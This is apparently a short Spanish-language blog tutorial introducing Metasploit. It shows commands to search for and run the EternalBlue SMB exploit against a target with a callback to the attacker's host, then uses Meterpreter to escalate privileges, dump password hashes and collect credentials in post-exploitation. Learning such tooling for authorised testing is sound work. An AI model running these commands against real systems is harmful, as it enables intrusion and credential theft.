---
layout: post
title: "Metasploit: Primeros Pasos"
read_time: ""
date: 2026-04-05
tags: [metasploit, exploit, msfconsole, meterpreter, post]
blog_category: herramientas
description: "Guía de inicio con Metasploit Framework: buscar módulos, configurar y lanzar exploits."
---

Metasploit es el framework de explotación más usado. Aquí lo básico para empezar.

## Iniciar msfconsole

```bash
msfconsole
```

## Buscar un módulo

```bash
search eternalblue
search type:exploit platform:windows smb
```

## Usar un módulo

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <IP>
set LHOST <TU_IP>
run
```

## Meterpreter: comandos básicos

```bash
sysinfo
getuid
getsystem        # intenta privesc
hashdump         # extrae hashes
shell            # shell del sistema
upload/download  # transferir archivos
```

## Post-explotación

```bash
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
```

## Recursos

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
